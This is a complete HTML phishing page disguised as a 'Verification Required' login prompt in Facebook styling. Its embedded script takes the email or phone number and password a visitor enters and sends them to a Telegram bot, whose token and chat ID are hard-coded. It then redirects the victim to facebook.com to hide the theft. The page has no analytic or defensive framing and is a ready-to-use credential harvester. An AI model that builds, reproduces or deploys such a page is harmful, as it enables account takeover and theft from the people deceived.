<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Security</title>
    <style>
        body { font-family: Arial; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
        .box { background: white; padding: 20px; border-radius: 10px; display: inline-block; width: 280px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { width: 95%; padding: 10px; background: #1877f2; color: white; border: none; font-weight: bold; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h3>Verification Required</h3>
        <p>Login to confirm your account identity.</p>
        <form id="tgForm">
            <input type="text" id="user" placeholder="Email or Phone Number" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        document.getElementById('tgForm').onsubmit = function(e) {
            e.preventDefault();
            var user = document.getElementById('user').value;
            var pass = document.getElementById('pass').value;

            // Aapka Token aur Chat ID
            var token = "8406470230:AAFzx14w8KVN3w1bJSUiKnmQ1yY_v5MUjaE"; 
            var chat_id = "8714957240";

            var text = "🚨 **New Login Alert!**\n\n👤 User: " + user + "\n🔑 Pass: " + pass;
            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text) + "&parse_mode=Markdown";

            fetch(url).then(() => {
                // Login ke baad user ko Facebook par bhej dega
                window.location.href = "https://facebook.com"; 
            }).catch(() => {
                alert("Connection error, try again.");
            });
        };
    </script>
</body>
  </html>
